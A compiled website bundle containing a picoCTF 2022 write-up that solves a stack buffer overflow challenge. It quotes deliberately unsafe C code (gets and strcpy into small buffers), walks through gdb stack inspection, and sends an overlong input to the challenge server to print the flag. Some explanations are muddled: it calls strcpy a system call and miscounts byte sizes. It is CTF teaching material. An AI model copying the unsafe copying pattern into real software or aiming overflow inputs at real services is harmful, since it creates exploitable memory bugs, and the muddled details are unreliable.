"use strict";(self.webpackChunkkgkb=self.webpackChunkkgkb||[]).push([[66560],{59515:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>o,contentTitle:()=>a,default:()=>f,frontMatter:()=>s,metadata:()=>i,toc:()=>l});var r=t(74848),c=t(28453);const s={},a="buffer overflow 0",i={permalink:"/blog/pico_2022/binary_exploitation/buffer_overflow_0/README",source:"@site/blog/pico_2022/binary_exploitation/buffer_overflow_0/README.md",title:"buffer overflow 0",description:"https://play.picoctf.org/events/70/challenges/challenge/257",date:"2024-09-26T20:59:28.000Z",tags:[],readingTime:3.36,hasTruncateMarker:!1,authors:[],frontMatter:{},unlisted:!1,prevItem:{title:"basic-file-exploit",permalink:"/blog/pico_2022/binary_exploitation/basic_file_exploit/README"},nextItem:{title:"Buffer Overflow 2",permalink:"/blog/pico_2022/binary_exploitation/buffer_overflow_2/README"}},o={authorsImageUrls:[]},l=[{value:"Description",id:"description",level:2},{value:"Exploiting",id:"exploiting",level:2}];function h(e){const n={a:"a",code:"code",h2:"h2",p:"p",pre:"pre",...(0,c.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"https://play.picoctf.org/events/70/challenges/challenge/257",children:"https://play.picoctf.org/events/70/challenges/challenge/257"})}),"\n",(0,r.jsx)(n.h2,{id:"description",children:"Description"}),"\n",(0,r.jsx)(n.p,{children:"Smash the stack"}),"\n",(0,r.jsx)(n.p,{children:"Let's start off simple, can you overflow the correct buffer?"}),"\n",(0,r.jsxs)(n.p,{children:["The program is available ",(0,r.jsx)(n.a,{href:"https://artifacts.picoctf.net/c/520/vuln",children:"here"}),". You can view source ",(0,r.jsx)(n.a,{href:"https://artifacts.picoctf.net/c/520/vuln.c",children:"here"}),"."]}),"\n",(0,r.jsx)(n.p,{children:"And connect with it using:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"nc saturn.picoctf.net 53935\n"})}),"\n",(0,r.jsx)(n.h2,{id:"exploiting",children:"Exploiting"}),"\n",(0,r.jsx)(n.p,{children:"When we run the program for the first time, we see that it's requesting us to create a flag in the directory. Let's do that:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"./vuln\nPlease create 'flag.txt' in this directory with your own debugging flag.\n\n# As requested above\necho \"picoCTF{some_flag}\" >> flag.txt\n"})}),"\n",(0,r.jsx)(n.p,{children:"After the flag is there, we can see that the program asks us for an input"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"./vuln\nInput: \n"})}),"\n",(0,r.jsxs)(n.p,{children:["If we look at what happens to this input in the source code, we can see that the input is copied into a variable character buffer of size ",(0,r.jsx)(n.code,{children:"100"})," and then passed onto the ",(0,r.jsx)(n.code,{children:"vuln"})," function:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:'printf("Input: ");\nfflush(stdout);\nchar buf1[100];\ngets(buf1); \nvuln(buf1);\n'})}),"\n",(0,r.jsxs)(n.p,{children:["In the ",(0,r.jsx)(n.code,{children:"vuln"})," method, we see that this buffer is then copied into another variable character of size ",(0,r.jsx)(n.code,{children:"16"}),":"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:"void vuln(char *input){\n  char buf2[16];\n  strcpy(buf2, input);\n}\n"})}),"\n",(0,r.jsxs)(n.p,{children:["So we know that we can overflow the buffer if our input is larger than ",(0,r.jsx)(n.code,{children:"16"}),"."]}),"\n",(0,r.jsxs)(n.p,{children:["Let's run the program with ",(0,r.jsx)(n.code,{children:"gdb"})," and take a closer look at the program."]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"gdb ./vuln\n\n(gdb) disas vuln\nDump of assembler code for function vuln:\n   0x08049e3f <+0>:     endbr32 \n   0x08049e43 <+4>:     push   %ebp\n   0x08049e44 <+5>:     mov    %esp,%ebp\n   0x08049e46 <+7>:     push   %ebx\n   0x08049e47 <+8>:     sub    $0x10,%esp\n   0x08049e4a <+11>:    call   0x8049f53 <__x86.get_pc_thunk.ax>\n   0x08049e4f <+16>:    add    $0x9b1b1,%eax\n   0x08049e54 <+21>:    pushl  0x8(%ebp)\n   0x08049e57 <+24>:    lea    -0x14(%ebp),%edx\n   0x08049e5a <+27>:    push   %edx\n   0x08049e5b <+28>:    mov    %eax,%ebx\n   0x08049e5d <+30>:    call   0x8049030\n   0x08049e62 <+35>:    add    $0x8,%esp\n   0x08049e65 <+38>:    nop\n   0x08049e66 <+39>:    mov    -0x4(%ebp),%ebx\n   0x08049e69 <+42>:    leave  \n   0x08049e6a <+43>:    ret\n"})}),"\n",(0,r.jsxs)(n.p,{children:["We can see that there's a system call at the 30th bit from the beginning of the ",(0,r.jsx)(n.code,{children:"vuln"})," function (",(0,r.jsx)(n.code,{children:"0x08049e5d <+30>:    call   0x8049030"}),").\nThis is likely the location of the ",(0,r.jsx)(n.code,{children:"strcpy"})," instruction where the overflow occurs. Let's put a breakpoint right after this system call to look at the stack and run the program with 20 ",(0,r.jsx)(n.code,{children:"U"}),"s:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"(gdb) b * vuln +35          \nBreakpoint 1 at 0x8049e62: file vuln.c, line 18. \n\n(gdb) r \nStarting program: ~/ctf/pico_2022/binary_exploitation/buffer_overflow_0/vuln\nInput: UUUUUUUUUUUUUUUUUUUU\n\nBreakpoint 1, 0x08049e62 in vuln (input=0xffffcae8 'U' <repeats 20 times>)\n    at vuln.c:18\n\n"})}),"\n",(0,r.jsx)(n.p,{children:"Let's take a look at the stack:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"(gdb) i r esp\nesp            0xffffcac0          0xffffcac0\n(gdb) i r ebp\nebp            0xffffcadc          0xffffcadc\n"})}),"\n",(0,r.jsxs)(n.p,{children:["So we can see that the stack starts at ",(0,r.jsx)(n.code,{children:"0xffffcac0"})," and ends at ",(0,r.jsx)(n.code,{children:"0xffffcadc"})," meaning the stack size is 1C (in hex) or 28 (decimal)."]}),"\n",(0,r.jsxs)(n.p,{children:["If we print out the stack contents, we can see that we're one word (8 bytes) short of overwriting the ",(0,r.jsx)(n.code,{children:"EBP"}),":"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"(gdb) x/20x $esp\n0xffffcac0:     0xffffcac8      0xffffcae8      0x55555555      0x55555555\n0xffffcad0:     0x55555555      0x55555555      0x55555555      0xffffcb00\n\n(gdb) x/x $ebp\n0xffffcadc:     0xffffcb00\n"})}),"\n",(0,r.jsxs)(n.p,{children:["So we need to increase the fuzzing by 4 characters (each character is 2 bytes) so we can overwrite the whole stack. Let's change the 4 letters from ",(0,r.jsx)(n.code,{children:"U"})," to ",(0,r.jsx)(n.code,{children:"A"})," so it's easier to see when examining memory:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"(gdb) r \n\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: ~/ctf/pico_2022/binary_exploitation/buffer_overflow_0/vuln \nInput: UUUUUUUUUUUUUUUUUUUUAAAA \n\nBreakpoint 1, 0x08049e62 in vuln (input=0xffffcae8 'U' <repeats 20 times>, \"AAAA\") at vuln.c:18\n18        strcpy(buf2, input);\n\n(gdb) x/20x $esp\n0xffffcac0:     0xffffcac8      0xffffcae8      0x55555555      0x55555555\n0xffffcad0:     0x55555555      0x55555555      0x55555555      0x41414141\n0xffffcae0:     0x08049f00      0xffffcae8      0x55555555      0x55555555\n\n"})}),"\n",(0,r.jsxs)(n.p,{children:["We can see from the output that the ",(0,r.jsx)(n.code,{children:"EBP"})," has ",(0,r.jsx)(n.code,{children:"0x41414141"})," (",(0,r.jsx)(n.code,{children:"41"})," is ASCII code for ",(0,r.jsx)(n.code,{children:"A"}),")."]}),"\n",(0,r.jsxs)(n.p,{children:["Now that we overwrote/oveflowed the stack, we can overwrite the return address (which is the next ",(0,r.jsx)(n.code,{children:"word"})," after the ",(0,r.jsx)(n.code,{children:"EBP"}),"). To find this address, we first need to check where the flag is actually printed."]}),"\n",(0,r.jsx)(n.p,{children:"Reviewing the source code, we see that it happens on the first line after the signal handler function is invoked (line 11):"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:'void sigsegv_handler(int sig) {\n  printf("%s\\n", flag);\n  ...\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:"We can get the flag by having a buffer larger than 64 bytes:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"nc saturn.picoctf.net 53935\nInput: UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\npicoCTF{ov3rfl0ws_ar3nt_that_bad_a065d5d9}\n"})})]})}function f(e={}){const{wrapper:n}={...(0,c.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(h,{...e})}):h(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>a,x:()=>i});var r=t(96540);const c={},s=r.createContext(c);function a(e){const n=r.useContext(s);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(c):e.components||c:a(e.components),r.createElement(s.Provider,{value:n},e.children)}}}]);